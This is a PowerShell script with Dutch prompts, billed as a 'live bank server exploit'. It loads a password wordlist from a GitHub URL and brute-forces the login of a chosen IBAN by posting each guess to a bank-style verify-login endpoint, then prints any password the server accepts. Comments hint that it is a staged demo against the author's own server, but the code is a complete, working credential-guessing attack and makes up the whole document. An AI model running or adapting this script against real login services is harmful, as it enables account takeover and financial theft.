$Host.UI.RawUI.ForegroundColor = "Green"

do {
    Clear-Host
    Write-Host "======================================================"
    Write-Host "          LIVE BANK SERVER EXPLOIT v5.0"
    Write-Host "======================================================"
    Write-Host ""

    Write-Host "[1] VOORBEREIDING"
    $urlList = Read-Host "Plak de URL van de GitHub Wordlist (Raw)"

    try {
        $wordlist = (Invoke-WebRequest -Uri $urlList -UseBasicParsing -ErrorAction Stop).Content -split "`n" | ForEach-Object { $_.Trim() }
        Write-Host "SUCCES: $($wordlist.Count) wachtwoorden geladen van GitHub." -ForegroundColor Cyan
    } catch {
        Write-Host "[FOUT] Kon GitHub lijst niet ophalen. Controleer de link!" -ForegroundColor Red
        $pauze = Read-Host "Druk op Enter om opnieuw te proberen..."
        $keuze = "j"
        continue
    }

    Write-Host ""
    Write-Host "[2] TARGETING"
    $iban = Read-Host "Voer het doelwit IBAN in"
    Write-Host ""
    Write-Host "Verbinding maken met: https://telefoon.wilste.nl..."
    Start-Sleep -Seconds 1
    Write-Host "------------------------------------------------------"

    # Stap 3: De Aanval
    $apiUrl = "https://telefoon.wilste.nl/bank/verify-login"
    $gevonden = $false

    foreach ($gok in $wordlist) {
        if ([string]::IsNullOrWhiteSpace($gok)) { continue }

        # De data voorbereiden voor jouw server
        $body = @{
            iban     = $iban
            password = $gok
        } | ConvertTo-Json

        try {
            # Stuur het verzoek naar de echte server
            $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"

            # We controleren of de server zegt dat het gelukt is
            # (Dit checkt op 'success': true of het woord 'success' in het antwoord)
            if ($response.success -eq $true -or $response -match "success") {
                Write-Host ""
                Write-Host "******************************************************"
                Write-Host "    [SUCCESS] MATCH GEVONDEN OP DE SERVER!"
                Write-Host "    WACHTWOORD: $gok"
                Write-Host "******************************************************"
                $gevonden = $true
                break
            } else {
                Write-Host "PROBEREN: $gok ... [GEWEIGERD]" -ForegroundColor Gray
            }
        } catch {
            Write-Host "PROBEREN: $gok ... [FOUTMELDING SERVER]" -ForegroundColor Red
        }

        # Een kleine pauze zodat mensen kunnen zien wat er gebeurt
        Start-Sleep -Milliseconds 150
    }

    if (-not $gevonden) {
        Write-Host ""
        Write-Host "[FAIL] Geen match gevonden. Probeer een andere lijst." -ForegroundColor Yellow
    }

    Write-Host ""
    $keuze = Read-Host "Scherm resetten voor een nieuw thema? (j/n)"

} while ($keuze -eq "j")

Write-Host "Systeem afgesloten."